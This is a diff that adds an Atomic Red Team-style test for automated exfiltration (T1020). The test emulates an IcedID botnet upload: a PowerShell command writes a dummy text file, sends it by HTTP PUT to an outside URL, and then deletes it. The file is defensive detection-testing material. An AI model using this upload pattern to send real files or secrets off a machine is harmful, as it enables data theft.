@@ -1,0 +1,31 @@
+attack_technique: T1020
+display_name: Automated Exfiltration
+atomic_tests:
+- name: IcedID Botnet HTTP PUT
+  description: |-
+    Creates a text file
+    Tries to upload to a server via HTTP PUT method with ContentType Header
+    Deletes the created file
+  supported_platforms:
+  - windows
+  dependencies:
+  - prereq_command: |
+      if (Test-Path "C:\temp\T1020_exfilFile.txt") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Force -Path "C:\temp\T1020_exfilFile.txt" -ItemType File -Value "This is a test file for exfiltration"
+  executor:
+    command: |-
+      $fileName = "C:\temp\T1020_exfilFile.txt"
+      $url = "https://google.com"
+      $content = "This is ART IcedID Botnet Exfil Test"
+      $file = New-Item -Force -Path $fileName -ItemType File -Value $content
+      $contentType = "application/octet-stream"
+      try {
+        Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName
+      } catch {
+        Write-Output "HTTP PUT request failed."
+      }
+    cleanup_command: |-
+      $fileName = "C:\temp\T1020_exfilFile.txt"
+      Remove-Item -Path $fileName -ErrorAction Ignore
+
